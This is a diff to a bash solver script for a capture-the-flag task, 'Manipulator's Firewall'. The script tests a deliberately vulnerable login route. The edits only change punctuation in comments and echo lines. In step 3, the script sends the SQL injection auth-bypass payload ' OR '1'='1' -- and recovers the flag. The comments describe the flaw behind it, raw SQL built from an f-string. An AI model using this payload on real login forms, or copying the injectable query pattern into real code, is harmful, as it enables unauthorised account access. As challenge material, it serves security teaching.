@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# solvers/p5_1.sh — Task 5.1 "Manipulator's Firewall" canonical exploit.
+# solvers/p5_1.sh, Task 5.1 "Manipulator's Firewall" canonical exploit.
 #
 # challenges/phase5.py's p5_1 route builds a raw SQL WHERE clause with an
 # f-string and hands it to SQLAlchemy's text() escape hatch instead of
@@ -12,12 +12,12 @@
 #
 #   1. A genuine, correctly-credentialed login (the seeded "sandbox"
 #      staff account) succeeds and reveals no secret (its secret column
-#      is empty) — the ordinary login path itself is not the bug.
-#   2. A wrong-password guess against the chairman's real account FAILS —
+#      is empty), the ordinary login path itself is not the bug.
+#   2. A wrong-password guess against the chairman's real account FAILS,
 #      proving the flag is not just handed out to anyone who tries.
 #   3. The classic `' OR '1'='1' -- ` auth-bypass payload, submitted with
 #      no real username or password at all, logs in as the chairman
-#      (lowest-id row) purely because it always evaluates true — and the
+#      (lowest-id row) purely because it always evaluates true, and the
 #      chairman's record carries the flag.
 
 set -uo pipefail
@@ -30,8 +30,8 @@ fail=0
 
 echo "[p5_1] target: ${ROUTE}"
 
-# --- Step 1 — a genuine correctly-credentialed login must succeed cleanly -
-echo "[p5_1] step 1 — legitimate login: username=sandbox&password=sandbox-pw"
+# --- Step 1: a genuine correctly-credentialed login must succeed cleanly -
+echo "[p5_1] step 1: legitimate login: username=sandbox&password=sandbox-pw"
 
 legit_resp=$(curl -s -X POST "$ROUTE" \
     -H "Accept: application/json" \
@@ -42,17 +42,17 @@ echo "  response: ${legit_resp}"
 if echo "$legit_resp" | grep -q '"success":true'; then
     echo "  ok: legitimate sandbox login succeeded"
 else
-    echo "[p5_1] FAIL: legitimate sandbox login did not succeed — route is broken"
+    echo "[p5_1] FAIL: legitimate sandbox login did not succeed, route is broken"
     fail=1
 fi
 if echo "$legit_resp" | grep -qF "$FLAG"; then
-    echo "[p5_1] FAIL: a non-chairman legitimate login leaked the flag — the flag"
+    echo "[p5_1] FAIL: a non-chairman legitimate login leaked the flag, the flag"
     echo "  must only be reachable via the chairman's own record."
     fail=1
 fi
 
-# --- Step 2 — a wrong-password guess against the real chairman must fail --
-echo "[p5_1] step 2 — wrong-password guess: username=netero&password=totally-wrong-guess"
+# --- Step 2: a wrong-password guess against the real chairman must fail --
+echo "[p5_1] step 2: wrong-password guess: username=netero&password=totally-wrong-guess"
 
 wrong_resp=$(curl -s -X POST "$ROUTE" \
     -H "Accept: application/json" \
@@ -67,8 +67,8 @@ else
     echo "  ok: wrong chairman password correctly rejected"
 fi
 
-# --- Step 3 — the ORM-injection auth bypass ---------------------------------
-echo "[p5_1] step 3 — auth bypass: username=' OR '1'='1' -- , password=anything"
+# --- Step 3: the ORM-injection auth bypass ---------------------------------
+echo "[p5_1] step 3: auth bypass: username=' OR '1'='1' -- , password=anything"
 
 bypass_resp=$(curl -s -X POST "$ROUTE" \
     -H "Accept: application/json" \
@@ -77,7 +77,7 @@ bypass_resp=$(curl -s -X POST "$ROUTE" \
 echo "  response: ${bypass_resp}"
 
 if echo "$bypass_resp" | grep -q '"success":true' && echo "$bypass_resp" | grep -qF "$FLAG"; then
-    echo "  ok: ORM-injection auth bypass logged in as the chairman — flag recovered: ${FLAG}"
+    echo "  ok: ORM-injection auth bypass logged in as the chairman, flag recovered: ${FLAG}"
 else
     echo "[p5_1] FAIL: auth-bypass payload did not log in as the chairman with the flag"
     fail=1
